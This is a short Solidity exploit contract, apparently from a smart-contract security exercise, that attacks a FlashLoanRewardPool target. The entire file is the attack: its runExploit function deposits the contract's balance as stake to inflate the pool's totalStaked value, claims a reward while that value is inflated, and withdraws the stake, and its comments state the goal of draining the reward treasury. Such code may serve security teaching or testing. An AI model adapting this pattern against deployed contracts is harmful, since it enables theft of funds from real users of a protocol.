// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {FlashLoanRewardPool} from "../src/FlashLoanRewardPool.sol";

contract ExploitModule {
    FlashLoanRewardPool public targetContract;

    constructor(address _target) payable {
        targetContract = FlashLoanRewardPool(payable(_target));
    }

    function runExploit() external payable {
        // Deposit stake to inflate the totalStaked value
        targetContract.depositStake{value: address(this).balance}();
        
        // Claim reward while totalStaked is inflated
        targetContract.claimReward();
        
        // Withdraw stake to drain the rewardTreasury
        targetContract.withdrawStake();
    }

    receive() external payable {}
}